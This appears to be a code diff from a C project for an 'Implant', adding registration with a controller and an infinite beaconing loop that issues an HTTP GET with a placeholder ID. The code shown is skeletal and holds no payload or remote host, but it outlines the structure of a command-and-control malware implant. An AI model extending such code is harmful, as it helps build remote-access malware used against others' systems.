@@ -34,11 +34,16 @@
 #include "Implant_v01.h"
 #include "tests/test.h"
 #include "lifecycle/register.h"
-
+#include "lifecycle/comms.h"
 
 int temp_loop() {
+    //note - do a while not registered?
+    register_implant(); // should return id or set it in settings, etc. 
+
     while (1) {
         //HTTP_GET
+        //placeholder id
+        get("019bbe19-2c0e-7ee1-a81a-78d7e1a97ac0");
 
         //ACTIONS
 
@@ -57,6 +62,8 @@ int main()
 
     //for debugging/sanity check, run all tests first. Remove for production use.
     test_all();
+
+    temp_loop();
 
     return 0;
 }
